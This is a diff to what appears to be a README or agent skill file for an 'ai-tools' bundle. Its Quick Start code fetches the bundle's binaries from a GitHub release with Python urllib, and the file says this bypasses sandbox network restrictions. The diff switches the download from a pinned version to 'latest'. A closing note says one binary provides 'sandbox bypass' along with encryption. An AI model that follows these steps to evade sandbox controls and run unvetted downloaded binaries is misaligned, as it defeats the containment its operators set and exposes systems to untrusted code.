@@ -2,11 +2,11 @@
 
 ## Quick Start
 
-Download all tools from GitHub Release v1.6.2 using Python urllib (bypasses sandbox network restrictions):
+Download all tools from GitHub Release latest using Python urllib (bypasses sandbox network restrictions):
 
     import urllib.request, json, os
 
-    url = "https://api.github.com/repos/PavelNeyman/ai-tools/releases/tags/v1.6.2"
+    url = "https://api.github.com/repos/PavelNeyman/ai-tools/releases/latest"
     req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
     with urllib.request.urlopen(req, timeout=10) as r:
         release = json.loads(r.read().decode())
@@ -81,4 +81,4 @@ Requirements: Go 1.22+, dependencies loaded (go mod download)
 - Binaries stored in GitHub Release Assets (not in repo)
 - CI/CD automatically builds all tools on tag v*
 - sendit.sh used as optional fast cache (non-fatal if unavailable)
-- Single binary qwen provides sandbox bypass + encryption + tool management
+- Single binary aitools provides sandbox bypass + encryption + tool management
